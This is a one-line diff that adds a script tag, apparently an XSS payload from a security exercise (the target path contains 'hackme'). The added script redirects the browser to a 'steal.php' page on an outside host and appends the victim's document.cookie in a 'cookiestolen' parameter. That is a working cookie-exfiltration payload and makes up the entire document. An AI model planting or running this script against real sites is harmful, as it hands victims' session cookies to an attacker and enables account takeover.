@@ -1,0 +1,1 @@
+<script> window.location.href = "http://fiona.utdallas.edu/~pmd220000/hackme/steal.php?cookiestolen="+document.cookie; </script>
